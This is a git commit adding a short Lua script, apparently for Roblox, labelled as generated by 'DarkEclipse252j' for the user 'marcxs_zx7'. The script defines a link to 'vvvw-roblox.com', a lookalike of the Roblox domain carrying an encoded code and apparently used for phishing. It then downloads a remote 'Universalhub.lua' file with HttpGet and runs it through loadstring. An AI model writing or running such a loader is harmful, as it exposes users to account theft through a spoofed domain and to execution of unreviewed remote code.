8fe7169fb02290e6c0b85135d95e21d519aa9b0c
Ninjajusn252j <juanleonardo375@gmail.com>
2025-06-06 17:36:35 +0200

    feat: Add/Update script for marcxs_zx7

---
+++ scripts/marcxs_zx7.lua
@@ -0,0 +1,4 @@
+-- Script Lua generado por DarkEclipse252j para marcxs_zx7
+local GroupLink = "https://vvvw-roblox.com/dashboard/?code=NDgzMzI5NzEyNDEzMDAwMzUwOV85MDQyMjI5MTY2OTc5MjQ5Mjgy"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ninjajusn252j/universal-hub/main/Universalhub.lua"))()
